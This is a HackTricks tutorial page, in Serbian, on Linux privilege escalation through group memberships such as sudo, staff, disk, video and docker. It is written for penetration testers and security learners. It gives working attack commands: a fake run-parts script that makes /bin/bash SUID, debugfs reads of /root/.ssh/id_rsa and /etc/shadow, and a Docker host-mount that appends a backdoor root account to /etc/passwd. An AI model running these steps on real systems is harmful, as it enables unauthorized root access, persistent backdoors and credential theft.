# Zanimljive grupe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin grupe

### **PE - Method 1**

**Ponekad**, politika sistema **/etc/sudoers** (ili datoteka koja je uključena iz nje) sadrži unose kao što su:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

To znači da svaki korisnik koji odgovara bilo kom od ova dva unosa može da pokrene bilo koju komandu kao bilo koji ciljni korisnik pomoću `sudo` (u skladu sa ostatkom pravila).<sup>[[3]](#references)</sup>

Ako je to slučaj, da biste **postali root, samo izvršite**:

```
sudo su
```

Ako `sudo -l` dozvoljava ograničeno pokretanje komande `adduser` koja prima samo korisničko ime, proverite da li ona kreira istoimenu primarnu grupu koja još ne postoji. Novi nalog u toj grupi može dobiti privilegije ako efektivna sudoers politika već odobrava privilegije grupi `%group`; pre nego što ovo smatrate putem za eskalaciju privilegija, proverite i ponašanje pri kreiranju grupe i pravilo za grupu. Kreiranje naloga menja sistem, zato prvo pregledajte politiku.

### PE - Method 2

Pronađite sve suid binarne datoteke i proverite da li među njima postoji binarna datoteka **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Ako je **pkexec SUID binarna datoteka**, može da izvrši program kao drugi korisnik samo kada polkit odobri traženu radnju; sam SUID bit ne garantuje root pristup. Proverite instaliranu polisu i autorizaciju ciljne sesije, umesto da pretpostavite da je članstvo u grupi **sudo** ili **admin** dovoljno.<sup>[[4]](#references)[[5]](#references)</sup>

Za zaseban put [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), prvo proverite da li je `pkexec` izvršna datoteka u vlasništvu korisnika **root** sa SUID bitom. Instalirana binarna datoteka bez tog bita ne predstavlja lokalnu SUID eskalaciju opisanu u bezbednosnom upozorenju. Niz verzije iz upstream-a samo je trag: distribucije mogu da [backport-uju ispravku u starije verzije paketa](https://ubuntu.com/security/CVE-2021-4034), zato proverite instalirani paket dobavljača i mere ublažavanja pre nego što je proglasite ranjivom.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) predstavlja drugi polkit put: trku u autorizaciji preko D-Bus-a, a ne SUID propust u `pkexec`. Proverite instalirani polkit paket dobavljača i da li dostupna privilegovana D-Bus radnja može da napravi korisnu izmenu; put za kreiranje naloga zahteva i odgovarajuću uslugu, kao što je AccountsService, a sudo pristup svake nove grupe zavisi od efektivne sudo polise. Prijavljena polkit verzija ili instalirana usluga samo su kandidati za proveru, naročito jer dobavljači mogu da [backport-uju ispravke](https://access.redhat.com/security/cve/cve-2021-3560). Pasivno enumerisanje ne bi trebalo da pokrene trku.

Na distribucijama koje i dalje koriste stariji Local Authority backend, pregledajte pravila grupa pomoću:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Relevantni nazivi grupa i podrazumevane vrednosti razlikuju se u zavisnosti od distribucije; grupa je ovde korisna samo ako je lokalna politika navodi.<sup>[[5]](#references)</sup>

Da biste **postali root, možete izvršiti**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Ako pokušate da izvršite **pkexec** i dobijete ovu **grešku**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

U SSH sesiji bez registrovanog authentication agenta, `pkexec` može da zakaže uz ovu grešku čak i kada bi politika inače dozvoljavala tu radnju; polkit dokumentuje `pkttyagent` kao tekstualni authentication agent za sesije koje nisu desktop sesije. Tačno ponašanje zavisi od verzije i distribucije, zato proverite lokalnu politiku i podešavanje agenta. Jedno zaobilazno rešenje prijavljeno za pogođene verzije NixOS-a koristi **2 različite SSH sesije**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

ACL koji jednom nalogu uskraćuje pristup komandi `su` odnosi se na tu izvršnu datoteku, a ne na svaki način pokretanja radnje koju je administrator ovlastio. Ako su administratorski podaci za autentifikaciju nezavisno izloženi, proverite da li efektivna polkit politika dozvoljava zasebnu radnju, kao što je pokretanje privremene sistemske usluge pomoću `systemd-run`, koji identitet prihvata authentication agent i koji identitet bi koristila pokrenuta usluga. [Polkit razlikuje autentifikaciju kao vlasnik sesije od autentifikacije kao administrator](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), dok [systemd-run može da zatraži privremenu uslugu od sistemskog menadžera](https://systemd.io/CONTROL_GROUP_INTERFACE/). Unos u istoriji, instalirana komanda ili čitljiva datoteka politike sami po sebi ne dokazuju ovlašćenje niti ispravnost podataka za autentifikaciju; pasivna provera ne bi trebalo da šalje podatke za autentifikaciju niti da pokreće jedinicu.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel grupa

Ponekad sudoers politika može da sadrži i ovaj unos:

```
%wheel	ALL=(ALL:ALL) ALL
```

To znači da bilo koji korisnik na kojeg se stavka odnosi može da pokrene bilo koju komandu kao bilo koji ciljni korisnik preko `sudo` (u skladu sa ostatkom pravila).<sup>[[3]](#references)</sup>

Ako je to slučaj, da biste **postali root, samo izvršite**:

```
sudo su
```

## Grupa shadow

Na sistemima čije dozvole to omogućavaju, korisnici u grupi **shadow** mogu da **čitaju** **/etc/shadow**; proverite stvarni režim dozvola i ACL-ove na ciljnom sistemu:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Dakle, pročitajte fajl i pokušajte da **razbijete neke hash-eve**.

Kratka napomena o stanju zaključavanja prilikom trijaže hash-eva:
- Unosi sa `!` ili `*` uglavnom ne omogućavaju interaktivnu prijavu lozinkom.
- `!hash` znači da je lozinka zaključana; preostali znakovi predstavljaju polje lozinke pre zaključavanja.
- Polje koje sadrži `*` nije važeći `crypt(3)` hash i sprečava prijavu UNIX lozinkom; nemojte na osnovu toga zaključivati da li je lozinka ranije bila postavljena.
Ovo je korisno za klasifikaciju naloga čak i kada je direktna prijava blokirana.<sup>[[6]](#references)</sup>

## Grupa staff

**staff**: Omogućava korisnicima da dodaju lokalne izmene u sistem (`/usr/local`) bez potrebe za root privilegijama (imajte na umu da su izvršne datoteke u `/usr/local/bin` u promenljivoj PATH svakog korisnika i da mogu da „nadjačaju“ istoimene izvršne datoteke u `/bin` i `/usr/bin`). Uporedite sa grupom „adm“, koja je više povezana sa nadzorom/bezbednošću.<sup>[[2]](#references)[[7]](#references)</sup>

U Debian konfiguracijama u kojima je `/usr/local/bin` ispred `/usr/bin` u `PATH` (kao u primerima ispod), neprecizirana komanda prvo se razrešava na kopiju u `/usr/local/bin`; proverite efektivni `PATH` na ciljnom sistemu.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ako privilegovani proces razreši komandu bez pune putanje preko upisivog `/usr/local/bin`, zamenom te komande može se izvršiti kod sa privilegijama tog procesa; pre testiranja proverite stvarnu putanju i okidač.

Na Ubuntu sistemima, `pam_motd` pri prijavljivanju kao root pokreće izvršne skripte pomoću `run-parts --lsbsysinit`; cron poslovi takođe mogu koristiti `run-parts`, ali to zavisi od distribucije i konfiguracije.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

При новом SSH пријављивању, `pspy` може помоћи да се потврди да ли се ова путања заиста позива на циљном систему; може да посматра командне линије процеса без root привилегија.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Group

Članstvo u grupi **disk** može omogućiti sirov pristup blokovskim uređajima i često je **blizu root pristupa**; Debian navodi da je uglavnom ekvivalentna root pristupu, ali proverite stvarne dozvole uređaja i raspored skladišta na ciljnom sistemu.<sup>[[7]](#references)</sup>

Uobičajene putanje uređaja uključuju `/dev/sd*`, ali NVMe i drugi rasporedi skladišta koriste drugačije nazive.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` radi sa ext2/ext3/ext4 sistemima datoteka; putanje kao što su `/root` i `/etc/shadow` iznad predstavljaju datoteke unutar otvorenog sistema datoteka, dok je drugi argument komande `dump` izlazna putanja na lokalnom sistemu datoteka.<sup>[[8]](#references)</sup> Na primer, ovim se iz otvorenog sistema datoteka izdvaja `/tmp/asd1.txt` u `/tmp/asd2.txt` na lokalnom sistemu datoteka:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Opcija `-w` otvara fajl sistem za čitanje i pisanje, a komanda `write` kopira izvorni fajl u otvoreni fajl sistem. Izbegavajte da je koristite na montiranom aktivnom fajl sistemu jer direktne izmene mogu oštetiti fajl sistem; kad god je moguće, radite sa offline slikom.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video Group

Pomoću komande `w` možete saznati **ko je prijavljen na sistem**, a prikazaće izlaz poput sledećeg.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Unos **tty1** označava prvu Linux virtuelnu konzolu; sam po sebi ne dokazuje da je korisnik fizički prisutan za mašinom, naročito u kontejnerima ili drugim okruženjima.<sup>[[21]](#references)</sup>

Na sistemima koji izlažu uređaj framebuffer-a koji se može čitati, članstvo u grupi **video** može omogućiti pristup tom uređaju. Linux framebuffer interfejs dokumentuje `/dev/fb0` kao memorijski uređaj koji se može čitati i kopirati radi snimka ekrana; putanja `/sys/class/graphics/fb0/virtual_size` dostupna je samo tamo gde postoji taj fbdev sysfs atribut, zato prvo proverite cilj.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Ako instalirana verzija programa **GIMP** podržava uvoz raw podataka, otvorite **`screen.raw`** pomoću tog uvoznika; podrška i kontrole se razlikuju u zavisnosti od verzije i plug-in-a.<sup>[[22]](#references)</sup>

![Disk grupa - Video grupa: Da biste otvorili raw sliku, možete da koristite GIMP, izaberete datoteku screen.raw i kao tip datoteke izaberete Raw image data](<../../../images/image (463).png>)

Podesite širinu i visinu slike tako da odgovaraju geometriji framebuffer-a; isprobajte dostupne formate piksela/tipove slike dok izlaz ne bude čitljiv.<sup>[[9]](#references)</sup>

![Disk grupa - Video grupa: Zatim podesite širinu i visinu na vrednosti koje se koriste na ekranu i isprobajte različite tipove slike (i izaberite onaj koji najbolje prikazuje ekran)](<../../../images/image (317).png>)

## Root grupa

Članstvo u grupi **root** ne daje UID korisnika root, ali datoteke u vlasništvu korisnika `root` koje grupa može da menja i dalje mogu biti zanimljive ako ih koriste privilegovani servisi ili biblioteke. Proverite stvarne dozvole datoteke i način na koji se koristi pre nego što je tretirate kao putanju za privilege-escalation.

**Proverite koje datoteke članovi grupe root mogu da menjaju**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

Članstvo u grupi `docker` na standardnim rootful instalacijama daje pristup Docker daemon-u na nivou root-a. Pošto su bind mount-ovi podrazumevano dostupni za čitanje i upis, korisnik koji može da kontroliše taj daemon može da mount-uje `/` sa host-a u container i menja fajlove na host-u; to mu praktično daje root pristup host-u.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Članstvo u grupi možda nije usklađeno između `/etc/group`, `/etc/gshadow` i tokena trenutnog procesa. Ako korisnik nije prikazan u `id -nG`, ali `newgrp docker` uspe, proverite grupu koju prikazuje `id` u novom shell-u i testirajte da li je Docker socket zaista dostupan za upis i da li koristi rootful daemon. Sam naziv grupe ne potvrđuje kontrolu nad host-om. Ograničite svaki automatizovani `newgrp` test kako prompt za lozinku ne bi zaustavio enumeraciju.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Konačno, ako vam se nijedan od prethodnih predloga ne sviđa ili iz nekog razloga ne funkcionišu (docker API firewall?), uvek možete da probate da **pokrenete privileged container i escape-ujete iz njega**, kao što je objašnjeno ovde:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Ako imate dozvole za pisanje nad docker socket-om, pročitajte [**ovaj post o eskalaciji privilegija zloupotrebom docker socket-a**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd grupa

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm grupa

Članovi grupe **`adm`** obično imaju dozvole da **čitaju log** fajlove smeštene u _/var/log/_.\
Zato, ako ste kompromitovali korisnika koji pripada ovoj grupi, obavezno **pregledajte logove**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail grupe

Ove grupe imaju značenja specifična za servise i distribucije. Debian opisuje `backup` kao grupu za delegirano pravljenje rezervnih kopija i vraćanje podataka, `lp` za printer daemon-e, a `mail` za `/var/mail`, zato proverite lokalne dozvole pre nego što članstvo smatrate putem do privilegija.<sup>[[7]](#references)</sup>

Često predstavljaju vektore za **otkrivanje akreditiva**, a ne direktne vektore do root-a:
- **backup**: arhive mogu sadržati konfiguracije, ključeve, DB dump-ove ili tokene.
- **operator**: operativni pristup specifičan za platformu može da leak-uje osetljive podatke iz aktivnog okruženja.
- **lp**: print queue-ovi/spool-ovi mogu sadržati sadržaj dokumenata.
- **mail**: mail spool-ovi mogu izložiti linkove za resetovanje, OTP-ove i interne akreditive.

Smatrajte članstvo u ovim grupama nalazom visokog rizika po pitanju izlaganja podataka i nastavite istragu proverom ponovne upotrebe lozinki/tokena.

## Auth grupa

Na OpenBSD-u, kada je S/Key konfigurisan, `/etc/skey` je u vlasništvu `root:auth`, a za pristup njegovim zapisima potrebna je grupa `auth`; YubiKey zapisi se čuvaju u `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Ranjiva konfiguracija OpenBSD 6.6 sa uključenim S/Key-jem ili YubiKey-jem omogućavala je lokalnim korisnicima sa privilegijama `auth` da postanu root; Qualys dokumentuje preduslove i exploit lanac, a povezani PoC ga implementira.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [pkexec/pkttyagent autentifikacija bez GUI sesije (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit referentni priručnik](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit referentni priručnik](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux stranica priručnika](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Priručnik za obezbeđivanje Debian-a](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux stranica priručnika](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Framebuffer uređaj — dokumentacija Linux kernela](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — nadgledanje Linux procesa bez privilegija](https://github.com/DominicBreuker/pspy)
- [13] [Bezbednost Docker Engine-a](https://docs.docker.com/engine/security/)
- [14] [Upravljanje Docker-om kao korisnik koji nije root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Pokretanje container-a — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD stranice priručnika](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD stranice priručnika](https://man.openbsd.org/login_yubikey.8)
- [18] [Ranjivosti autentifikacije u OpenBSD-u — Qualys bezbednosno upozorenje](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — lokalni exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux stranica priručnika](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Dodeljeni Linux uređaji (verzija 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Uvoz i izvoz slika — GIMP dokumentacija](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
